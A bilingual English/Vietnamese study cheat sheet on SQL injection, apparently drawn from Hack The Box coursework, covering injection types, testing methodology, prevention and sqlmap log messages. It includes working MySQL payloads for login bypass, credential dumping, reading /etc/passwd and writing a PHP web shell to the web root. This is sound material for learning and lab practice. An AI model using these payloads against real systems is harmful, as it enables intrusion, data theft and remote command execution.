# Table of contents
1. [SQL](#SQL)
2. [SQLi](#SQLi)
3. [Methodology](#Methodology)
4. [How to do](#How-to-do)
5. [Prevent](#Prevent)
6. [HTB cheatsheet](#HTB-cheatsheet)
7. [SQLmap](#SQLmap)

# SQL

## DBMS

| Category                          | Details                                                                                                    |
|-----------------------------------|------------------------------------------------------------------------------------------------------------|
| DBMS                              | - Database Management System<br>- Helps manage databases                                                   |
| Various Types of DBMS             | - File-based<br>- Relational DBMS<br>- NoSQL<br>- Graph-based<br>- Key/Value stores                        |
| Ways to Interact with DBMS        | - Command-line tools<br>- Graphical interface<br>- APIs (Application Programming Interfaces)               |
| Must-Have Features of a DBMS      | - **Concurrency**: Many users at the same time, ensuring data integrity<br> - **Consistency**: Maintains data consistency and validity during concurrent interactions<br> - **Security**: Prevents unauthorized viewing or editing of data<br> - **Reliability**: Supports easy backup to prevent data loss or breaches<br> - **SQL**: Simplifies user interaction |
| Two-Tiered Architecture           | User --> Web GUI (Tier 1) --> App Server (Tier 2) --> DBMS                                                |
| Main Types of Databases           | - Relational DB (uses SQL)<br>- Non-relational DB (uses various communication methods)                    |

<br>

| Relational Database                                   | Non-relational Database                                                 |
|-------------------------------------------------------|-------------------------------------------------------------------------|
| Uses tables with keys to link data                    | Does not use tables, rows, or columns like relational databases         |
| Uses schemas to define the data structure             | Stores data using different models based on the type of data            |
| Tables are associated with keys for quick data access | Lack of defined structure allows for scalability and flexibility        |
| Different tables are related to each other through keys | 4 common models: Key-Value, Document-Based, Wide-Column, and Graph     |
| Links tables using keys for data integration          | Suitable for datasets with undefined or unstructured data               |
| Tables can have multiple keys to link with other tables | Has a different method for injection called NoSQLi                     |
| Relationships between tables are defined by a schema  |                                                                         |

<br>

| Operator | Symbol |
|----------|--------|
| AND      | `&&`   |
| OR       | `\|\|`   |
| NOT      | `!`    |


# SQLi

![Screenshot 2024-11-07 122957](https://github.com/user-attachments/assets/b2fbce56-279d-4aa6-a559-642431fe43ab)

## In-Band
> Can see the messages or results

| Type | Description |
| --- | --- |
| **In-Band** (can see the messages or results) | - **Error Based Injection**: Force DB to generate Error Message --> To gain info likes: DB types and vers, SQL command being used, ... <br> - **Union Based Injection**: Leverage the UNION operator to combine the result of 2 queries into 1 (1 legit query from app + 1 query attack)
| **Blind (cant see the messages or results)** | - **Boolean Based**: True or False query, using 1=1 or 1!=1, SUBSTRING, ...<br> - **Time Based**: Pause the DB for a specific of time (to determine the query we make is correct or not) using Sleep() function
| **Out-Of-Band** | Using different channels to inject like: requests, DNS records |

<br>

# Methodology

## Black Box

| Step | Description |
| --- | --- |
|1. Map the app| - Visit all the urls as a user<br> - Walk through all the accessible pages as a user<br> - Make note of all Input vectors that potentially talk to the back-end<br> - Understand how application functions<br> - Figure out the logic of application<br> - Find subdomains, directories, pages that might not be directly visible |
|2. Fuzzing the app | - Fuzzing with SQL specific characters like: ' ; " ; # ; / ;...and look for anomalies<br> - Depend on how the app responds, start refining your query until achieve end goal (figure out the back-end query of the app)<br> - Submit Boolean conditions like: OR 1=1 and OR 1=2, and look for differences in app responses<br> - Submit payloads designed to trigger time delays when executed within a SQL query, and look for differences in the time taken to respond<br> - Submit OAST payload that are designed to trigger a network interaction with a server that you control. And if you get that network interaction (like a dns lookup, or through HTTP, ...) --> Vuln to out-of-band SQLi. |

## White Box

| Step | Description |
| --- | --- |
| 1. Enable web server logging | - Help when you fuzzing the app like with black-box, it will generates all different invalid characters you input into the app ==> Detect SQLi do exists and help to define your later payload |
| 2. Enable DB logging | - When you think that there's a SQLi vuln and you enter a SQLi payload in the parameter, you can see how it was logged at the back-end<br> - Depending on how you was logged at the back-end, you can see what characters made it through and in what format they made it through<br> - Base on that, you can conclude that SQLi exists or not |
|3. Map the app (like with black-box) | - Map all visible functionality of the app<br> - Map all input vectors that potentially talk to the back-end<br> - Regex search on all instances in the code that talk to the database |
| 4. Code review| Follow the code path for all input vectors |
| 5. Fuzz the app | - Submit sql characters that could potentially break query<br> - Look at how they were logged using DB logging<br> Make conclusion if app is vuln to SQLi or not. If it does, code review of that functionality<br>
| 6. Test any potential SQLi vuln | |

# How to do

## Error-based

- Submit SQL-specific characters like: `'` or `"` and look for errors or anomalies
- Different characters can give you different errors --> (Do Fuzz to check)

## Union-based

- Use UNION operator.
- Follow 2 basic rule of UNION:
    + Number and the other columns must be the same in all queries
    + The data type must be compatible
- Exploitation:
  + Figure out the number of columns that the query is making
  + Figure out the data types of the columns (mainly interested in string data)
  + Use UNION operator to output info from DB.
- Find the number of columns:
  + Using **ORDER BY**: `= ... order by 1`. Tăng số 1 lên đến khi gặp lỗi. Số trước khi gặp lỗi là số lượng columns có trong DB
  + Using **NULL Values**: `= ... UNION SELECT NULL--`. Tăng dần số lượng NULL đến khi dò ra được số columns: `'UNION SELECT NULL, NULL--`
- Find datatype (Vì ta chỉ quan trọng đến dạng string, nên ta sẽ test xem các columns có thể chứa giá trị là string hay không):
  + `' UNION SELECT 'a', NULL--`. Nếu fail, tiếp tục columns tiếp: `' UNION SELECT NULL, 'a'--`. Và so on...

## Boolean-Based Blind SQLi

- Submit a Boolean condition that evaluates to **False** and note the response
- Submit a Boolean condition that evaluates to **TRUE** and note the response
- If the response is different = SQLi boolean blind vuln
- Write a program/use tools that uses conditional statements to ask the DB a series of TRUE/FALSE question and monitor response

## Time-Based Blind SQLi

- Submit a payload that pause the app for a specified period of time
- If the app does pause = Vuln
- Use tools/Write a program that uses conditional statements to ask the DB a series of TRUE/FALSE question and monitor response time

## Out-of-band SQLi

- Submit OAST payloads designed to trigger an out-of-band network interaction when executed within an SQL query and monitor for any resulting interactions
- Depending on SQLi use different methods to exfil data

# Prevent

- Primary Defenses:
  + Op1: Use of Prepared Statements (Parameterized Queries)
  + Op2: Use of Stored Procedures (Partial)
  + Op3: Whitelist Input Validation (Partial)
  + Op4: Escaping All User Supplied Input (Partial)

- Additional Defenses:
  + Op5: Enforcing Least Privilege
  + Op6: Performing Whitelist Input Validation as a Secondary Defense

# HTB cheatsheet

Auth Bypass: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass

INFORMATION_SCHEMA Database contains metadata of DBs and Tables in the server.

| Technique                              | Description                                                                                                   |
|----------------------------------------|---------------------------------------------------------------------------------------------------------------|
| `' or 1=1-- -`                         | Basic SQL injection to bypass login or test vulnerability                                                     |
| `' order by 1-- -`                     | Detects the number of columns by incrementing the number in `ORDER BY` until an error occurs (total columns)  |
| `' UNION select 1,2,3-- -`             | Detects the number of columns using `UNION` injection by increasing the number of columns until no error      |
| `SELECT @@version`                     | Checks the database version                                                                                   |
| `SELECT SLEEP(5)`                      | Blind SQL injection to pause execution, used with other clauses to confirm queries                            |
| `SELECT POW(1,1)`                      | Alternative blind SQL injection method to verify responses                                                    |
| `SELECT * FROM my_database.users;`     | Selects data from another database or table                                                                   |
| `SELECT database()`                    | Retrieves the current database name                                                                           |

<br>

List of databases --> List of tables within each database --> List of columns within each table

List all databases:		`' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -`

List of tables within each database: `' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -` (TABLE_NAME column stores table names, TABLE_SCHEMA column points to the database each table belongs to)

List of columns within each table: `' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA,5 from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -`

Dump data from a table in another database: `' UNION select 1, username, password, 4 from dev.credentials-- -`

## Reading files

The DB user must have the **FILE privilege** to load a file's content into a table and then dump data from that table and read files.

Current USER: 
- `SELECT USER()`
- `SELECT CURRENT_USER()`
- `SELECT user from mysql.user`

Check USER Privileges:
- `SELECT super_priv FROM mysql.user`
- `UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -`
- `UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -`
- `UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -`
- `UNION SELECT 1, grantee, privilege_type, 4, 5 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -`

## LOAD_FILE

Now that we know we have enough **privileges to read local system files**, let us do that using the **LOAD_FILE() function**.

`SELECT LOAD_FILE('/etc/passwd');`

`UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -`

`UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -` : the page ends up rendering the HTML code within the browser. The source code shows us the entire PHP code, which could be inspected further to find sensitive information like database connection credentials or find more vulnerabilities.

## Writing files

To be able to **write files** to the back-end server using a MySQL database, we **require** three things:
- User with **FILE privilege** enabled
- MySQL global **secure_file_priv** variable **not enabled**
- **Write access** to the location we want to write to on the back-end server

The **secure_file_priv** variable is used to determine **where to read/write files from**. An **empty value** lets us **read** files from the entire file system. Otherwise, if a certain directory is set, we can only read from the folder specified by the variable. On the other hand, **NULL** means we **cannot read/write** from any directory. `SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"`

## SELECT INTO OUTFILE

The **SELECT INTO OUTFILE** statement can be used to **write data*** from select queries into files.
- `SELECT * from users INTO OUTFILE '/tmp/credentials';`
- `SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';`

## Writing Files through SQL Injection

To write a web shell, we must know the **base web directory** for the web server (i.e. **web root**). One way to find it is to use load_file to read the server configuration, like Apache's configuration found at `/etc/apache2/apache2.conf`, Nginx's configuration at `/etc/nginx/nginx.conf`, or IIS configuration at `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`, or we can search online for other possible configuration locations. Furthermore, we may run a fuzzing scan and try to write files to different possible web roots.
- `select 'file written successfully!' into outfile '/var/www/html/proof.txt'`
- `union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -`

## Writing a Web Shell

`<?php system($_REQUEST[0]); ?>`
`union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -`

Once again, we don't see any errors, which means the file write probably worked. This can be verified by browsing to the /shell.php file and executing commands via the 0 parameter, with ?0=id in our URL: `http://SERVER_IP:PORT/shell.php?0=id`


# SQLmap

see the types of SQL injections supported by SQLMap:	`sqlmap -hh` (advanced listing); `sqlmap -h` (basic listing)

The technique characters **BEUSTQ** refers to the following:
- B: Boolean-based blind
- E: Error-based
- U: Union query-based
- S: Stacked queries
- T: Time-based blind
- Q: Inline queries

## Log Messages Description

Below are some of the most common messages usually found during a scan of SQLMap:
- `URL content is stable/"target URL content is stable"`: không có thay đổi lớn nào giữa các phản hồi trong trường hợp các yêu cầu giống hệt nhau liên tục
- `Parameter appears to be dynamic/"GET parameter 'id' appears to be dynamic"`: Ta mong muốn tham số được thử nghiệm là "động", vì đó là dấu hiệu cho thấy bất kỳ thay đổi nào được thực hiện đối với giá trị của nó sẽ dẫn đến thay đổi trong phản hồi, do đó, tham số có thể được liên kết với DB
- `Parameter might be injectable/ "heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS:'MySQL')"`: lỗi DBMS là một dấu hiệu tốt về SQLi tiềm ẩn.
- `Parameter might be vulnerable to XSS attacks/"heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks"`: helpfull if no SQLi found
- `Back-end DBMS is '...'/"it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]"`: Trong trường hợp có dấu hiệu rõ ràng cho thấy mục tiêu đang sử dụng DBMS cụ thể, chúng ta có thể thu hẹp payload xuống chỉ còn DBMS cụ thể đó.
- `Level/risk values/"for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]"`: chạy tất cả các payload SQLi cho DBMS cụ thể đó, trong khi nếu không phát hiện thấy DBMS nào, thì chỉ các payload hàng đầu mới được kiểm tra
- `Reflective values found/"reflective value(s) found and filtering out"`: Chỉ là cảnh báo rằng các phần của payload đã sử dụng được tìm thấy trong phản hồi. SQLMap có cơ chế lọc để loại bỏ rác như vậy trước khi so sánh nội dung trang gốc.
- `Parameter appears to be injectable/"GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="luther")"`:
  + Thông báo này cho biết tham số có vẻ như có thể tiêm được, mặc dù vẫn có khả năng là kết quả false positive.
  + Trong trường hợp boolean-based blind and similar SQLi types (e.g., time-based blind), khả năng cao là false-positives.  

